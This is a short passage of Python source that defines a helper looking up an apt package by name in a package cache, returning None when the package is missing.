   318	def get_pkg_version(pkg_name: str) -> Optional[str]:
   319	    with PreserveAptCfg(get_apt_pkg_cache) as cache:
   320	        try:
   321	            package = cache[pkg_name]
   322	        except KeyError:
   323	            return None
   324	
